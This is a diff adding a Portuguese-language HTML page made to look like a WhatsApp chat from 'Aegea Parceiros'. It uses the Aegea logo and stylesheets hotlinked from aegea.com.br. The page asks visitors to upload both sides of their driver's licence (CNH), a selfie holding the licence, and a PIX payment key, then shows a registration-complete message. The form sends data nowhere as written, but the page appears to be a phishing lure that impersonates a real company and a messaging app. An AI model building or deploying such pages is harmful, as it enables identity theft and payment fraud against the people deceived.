@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>WhatsApp - Validação Final</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel='stylesheet' id='wp-block-library-css' href='https://www.aegea.com.br/wp-includes/css/dist/block-library/style.min.css?ver=6.8.3' media='all' />
+  <link rel='stylesheet' id='hello-elementor-css' href='https://www.aegea.com.br/wp-content/themes/hello-elementor/assets/css/reset.css?ver=3.4.5' media='all' />
+  <link rel='stylesheet' id='hello-elementor-theme-style-css' href='https://www.aegea.com.br/wp-content/themes/hello-elementor/assets/css/theme.css?ver=3.4.5' media='all' />
+  <link rel='stylesheet' id='elementor-frontend-css' href='https://www.aegea.com.br/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=3.32.5' media='all' />
+  <style>
+    body {
+      background: #ece5dd;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .wa-container {
+      max-width: 420px;
+      margin: 32px auto;
+      border-radius: 16px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+      background: #fff;
+      overflow: hidden;
+      border: 1px solid #dadada;
+    }
+    .wa-header {
+      background: #075e54;
+      color: #fff;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+    }
+    .wa-header img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      margin-right: 12px;
+    }
+    .wa-header .wa-title {
+      font-weight: bold;
+      font-size: 1.1em;
+    }
+    .wa-chat {
+      background: #ece5dd;
+      padding: 18px 12px 80px 12px;
+      min-height: 400px;
+      position: relative;
+    }
+    .wa-bubble {
+      background: #fff;
+      border-radius: 8px 8px 8px 0;
+      box-shadow: 0 1px 1px rgba(0,0,0,0.04);
+      padding: 14px 16px;
+      margin-bottom: 16px;
+      max-width: 90%;
+      font-size: 1em;
+      color: #222;
+      position: relative;
+    }
+    .wa-bubble.bot {
+      background: #dcf8c6;
+      align-self: flex-start;
+      border-radius: 0 8px 8px 8px;
+      margin-left: 0;
+    }
+    .wa-bubble.user {
+      background: #fff;
+      align-self: flex-end;
+      border-radius: 8px 0 8px 8px;
+      margin-left: auto;
+      color: #222;
+    }
+    .wa-upload {
+      margin: 12px 0 0 0;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .wa-upload label {
+      font-size: 1em;
+      margin-bottom: 3px;
+    }
+    .wa-upload input[type="file"] {
+      background: #f7f7f7;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      padding: 6px;
+      font-size: 1em;
+    }
+    .wa-upload input[type="text"] {
+      background: #fff;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      padding: 8px;
+      font-size: 1em;
+    }
+    .wa-accept {
+      margin: 16px 0 0 0;
+      display: flex;
+      align-items: center;
+    }
+    .wa-accept input[type="checkbox"] {
+      accent-color: #075e54;
+      margin-right: 8px;
+      width: 18px;
+      height: 18px;
+    }
+    .wa-footer {
+      position: absolute;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: #f7f7f7;
+      padding: 10px 12px;
+      border-top: 1px solid #e0e0e0;
+      display: flex;
+      align-items: center;
+    }
+    .wa-footer input {
+      flex: 1;
+      border: none;
+      border-radius: 20px;
+      padding: 8px 14px;
+      font-size: 1em;
+      outline: none;
+      background: #fff;
+      margin-right: 8px;
+    }
+    .wa-footer button {
+      background: #25d366;
+      border: none;
+      color: #fff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      font-size: 1.2em;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .wa-footer button:hover {
+      background: #128c7e;
+    }
+    .wa-success {
+      background: #e2ffe2;
+      color: #075e54;
+      border-radius: 8px;
+      padding: 14px 16px;
+      margin-top: 18px;
+      font-weight: bold;
+      border: 1px solid #b6eab6;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="wa-container" role="main">
+    <div class="wa-header">
+      <img src="https://www.aegea.com.br/wp-content/uploads/2024/02/aegea.svg" alt="Logo Aegea" />
+      <div>
+        <div class="wa-title">Aegea Parceiros</div>
+        <div style="font-size:0.9em;opacity:0.8;">online agora</div>
+      </div>
+    </div>
+    <div class="wa-chat" aria-label="Conversa WhatsApp">
+      <div class="wa-bubble bot">
+        Para finalizar seu cadastro, precisamos de algumas informações:
+        <ul style="margin:10px 0 0 20px;">
+          <li>Upload da sua CNH (frente e verso) + Selfie</li>
+          <li>Chave PIX</li>
+          <li>Leitura e aceite do termo de adesão</li>
+        </ul>
+      </div>
+      <form>
+        <div class="wa-bubble user">
+          <div class="wa-upload">
+            <label for="cnh">CNH (frente e verso):</label>
+            <input type="file" id="cnh" name="cnh" accept="image/*,.pdf" aria-label="Upload CNH" />
+            <label for="selfie">Selfie segurando a CNH:</label>
+            <input type="file" id="selfie" name="selfie" accept="image/*" aria-label="Upload Selfie" />
+            <label for="pix">Chave PIX:</label>
+            <input type="text" id="pix" name="pix" placeholder="Digite sua chave PIX" aria-label="Chave PIX" />
+          </div>
+          <div class="wa-accept">
+            <input type="checkbox" id="aceite" name="aceite" required />
+            <label for="aceite">Li e aceito os <a href="#" style="color:#075e54;text-decoration:underline;">termos de adesão</a></label>
+          </div>
+        </div>
+        <div class="wa-bubble bot">
+          Após enviar seus documentos e aceitar o termo, clique em <strong>Finalizar Cadastro</strong>.
+        </div>
+      </form>
+      <div class="wa-success" role="status">
+        <svg width="24" height="24" fill="none" style="vertical-align:middle;margin-right:6px;" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="12" fill="#25d366"/><path d="M7 13l3 3 7-7" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        Cadastro concluído! Em breve entraremos em contato pelo WhatsApp.
+      </div>
+      <div class="wa-footer">
+        <input type="text" placeholder="Digite uma mensagem" disabled aria-label="Campo de mensagem" />
+        <button type="button" aria-label="Enviar">
+          <svg width="22" height="22" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M2 11L20 2L11 20L9 13L2 11Z" fill="#fff"/></svg>
+        </button>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
